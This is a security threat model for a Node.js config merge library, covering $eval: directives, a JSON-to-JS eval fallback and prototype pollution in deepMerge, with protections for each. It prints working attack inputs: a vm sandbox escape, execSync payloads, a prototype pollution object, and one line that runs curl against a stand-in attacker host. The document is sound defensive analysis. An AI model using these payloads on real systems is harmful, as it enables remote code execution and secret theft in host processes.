# Threat Model — Config Merge Library

## 1. Global Security Context

**Trust Boundaries**
- `base` / `override` arguments to `merge()` — trusted if from internal config
  files; untrusted if sourced from user input, network, or external files
- `jsonString` argument to `loadFromString()` — untrusted if read from user
  input, environment variables, or remote sources
- `$eval:` directive values — untrusted; they are arbitrary JS expressions
  embedded in config values
- Node.js `vm` module sandbox — provides some isolation but **not a security
  boundary**; a determined attacker can escape it in the same process

**Key Assets**
- Host process memory and file system (via `require`, `process`, `fs`)
- Environment variables (`process.env`)
- Network access (`require('http')`, `require('child_process')`)
- Application secrets held in the Node.js process

**Attacker Model**
- Attacker controls config file content, a JSON string passed to
  `loadFromString`, or a `$eval:` value in a config object sourced from
  user-supplied data
- Goal: achieve arbitrary JavaScript execution in the host process, read
  environment variables, exfiltrate secrets, or pivot to RCE via
  `child_process.execSync`

---

## 2. Function-Level Threats

### Function: `index.js:resolveEvals()`
*Role*: Evaluates `$eval:` directives via `vm.runInNewContext`  
*Untrusted inputs*: The expression string after `$eval:` (from config values)  
*Security-relevant operations*: `vm.runInNewContext(expr, sandbox, {timeout})`  

*Threats*:

- **T1: Arbitrary code execution via `$eval:` (CWE-94)**  
  A config value `"$eval:require('child_process').execSync('id')"` — or
  `"$eval:process.env.SECRET"` — is evaluated as live JavaScript. If the
  sandbox context contains `require` or `process`, the attacker reaches the
  host.  
  Even with an empty context, Node.js vm is **not a security sandbox**:
  ```js
  // Classic vm escape — always works in same process:
  vm.runInNewContext("this.constructor.constructor('return process')().exit(1)", {})
  ```
  An attacker who controls a `$eval:` value can call `process.exit`,
  read `process.env`, or spawn child processes.

- **T2: Infinite loop / CPU exhaustion (CWE-400)**  
  `"$eval: while(true){}"` hangs the event loop forever without a timeout.

- **T3: `$eval:` on deeply nested or circular structures (CWE-400)**  
  Pathological configs with 1000-level nesting cause stack overflow in
  `resolveEvals`; a config with a circular reference causes infinite recursion.

- **T4: `$eval:` result is a non-primitive object with prototype pollution**  
  The expression returns `Object.prototype` itself or a getter that pollutes
  the prototype chain when the result is merged back into the config.

*Protections*:
- `vm.runInNewContext(expr, Object.create(null), {timeout: 100})` —
  context with null prototype (no `Object.prototype` chain), hard timeout
- Pass a **deep frozen copy** of the merged config as the context — removes
  `require`, `process`, `module` from scope; attacker cannot inject them
  because the context is a new object with null prototype
- Validate the `$eval:` result: only primitives (string, number, boolean,
  null) or plain objects are accepted back; reject functions and class instances
- Depth counter in `resolveEvals` — throw `RangeError` above MAX_DEPTH (32)
- Note in documentation: **do not use `$eval:` with untrusted config sources**

---

### Function: `index.js:loadFromString()`
*Role*: Parses a JSON string; falls back to JS expression evaluation  
*Untrusted inputs*: `jsonString` — entire string from caller  
*Security-relevant operations*: `JSON.parse`, `vm.runInNewContext('(' + str + ')')`  

*Threats*:

- **T5: Arbitrary code execution via fallback `eval` path (CWE-94)**  
  When `JSON.parse` fails, the code falls back to evaluating the raw string
  as a JS expression. A caller-supplied string like:
  ```
  (()=>{ require('child_process').execSync('curl attacker.com'); return {}; })()
  ```
  is a valid JS expression that evaluates to `{}` while executing a shell
  command. The JSON parse fails (it's not JSON), triggering the fallback.

- **T6: Prototype pollution via `__proto__` in JSON (CWE-20)**  
  `JSON.parse('{"__proto__":{"admin":true}}')` creates an object whose
  `__proto__` key pollutes `Object.prototype` when merged, making
  `({}).admin === true` for all plain objects in the process.

- **T7: Billion laughs / deeply nested JSON (CWE-400)**  
  `JSON.parse` of `{"a":{"a":{"a":...}}}` 10,000 levels deep causes a
  stack overflow in `JSON.parse` itself (V8 handles ~1000 levels before
  crashing the process).

- **T8: Timeout bypass in vm fallback (CWE-400)**  
  `vm.runInNewContext` timeout kills the script thread but the event loop
  itself is unaffected; a busy-loop in a `Promise` or `setImmediate`
  can outlive the timeout in some Node.js versions.

*Protections*:
- `JSON.parse` with a **reviver that blocks `__proto__`, `constructor`,
  `prototype` keys** — prevents prototype pollution (T6)
- vm fallback uses `Object.create(null)` context + 100 ms timeout (T5)
- Validate result of both paths: `isPlainObject(result)` — throw if not
- Document clearly: the fallback path executes JavaScript; callers should
  only use it with trusted strings

---

### Function: `index.js:deepMerge()`
*Role*: Recursively merges two plain objects  
*Untrusted inputs*: Any key or value in `base` or `override`  
*Security-relevant operations*: Property enumeration, recursive calls  

*Threats*:

- **T9: Prototype pollution via `__proto__` / `constructor` keys (CWE-20)**  
  If `override` contains the key `__proto__`, assigning
  `merged['__proto__'] = override['__proto__']` silently mutates
  `Object.prototype` for the entire process:
  ```js
  merge({}, JSON.parse('{"__proto__":{"isAdmin":true}}'))
  // → ({}).isAdmin === true   // every plain object in process
  ```

- **T10: Stack overflow on circular reference (CWE-400)**  
  ```js
  const a = {}; a.self = a;
  merge({}, a);  // infinite recursion → RangeError: Maximum call stack
  ```

*Protections*:
- Skip `__proto__`, `constructor`, and `prototype` keys in `deepMerge`
  using `Object.prototype.hasOwnProperty` check + explicit key blocklist
- Use `Object.create(null)` for the intermediate merged object to prevent
  prototype chain access
- `Object.keys()` (own enumerable only) instead of `for...in` to avoid
  inherited key iteration

---

## 3. Project Integrity

**Critical Risks**

1. **`vm` is not a security sandbox**: Node.js documentation explicitly
   states this. The `$eval:` and fallback eval features make this library
   **unsuitable for use with untrusted config input** without an additional
   security layer (separate process, Worker with `--no-addons`, or
   policy manifest). This is documented prominently in the README.

2. **Prototype pollution is a process-wide vulnerability**: a single
   successful `__proto__` injection via `merge()` or `loadFromString()`
   corrupts `Object.prototype` for every module in the process. The
   `__proto__` key blocklist in `deepMerge` and the JSON reviver are the
   primary defences.

3. **Fallback eval on malformed JSON**: the JS object literal fallback is
   the highest-risk feature. Every caller of `loadFromString` must treat it
   as executing code, not parsing data.

**Top 3 Attack Vectors**
1. `$eval: this.constructor.constructor('return process')().env` in a
   config value → full `process` object access (T1)
2. `loadFromString('(()=>{require("child_process").execSync("id");return{};})()')` →
   RCE via fallback eval path (T5)
3. `merge({}, {"__proto__":{"isAdmin":true}})` → prototype pollution
   affecting all objects in the process (T9)

**Recommended Additions**
- Run config evaluation in a `worker_threads` Worker with `--no-addons
  --disable-proto=delete` flags for genuine isolation
- Use `Object.freeze(merged)` before passing as vm context to prevent
  sandbox mutation
- Add a `safe` mode flag that disables `$eval:` and the JS fallback entirely
  for callers handling untrusted input
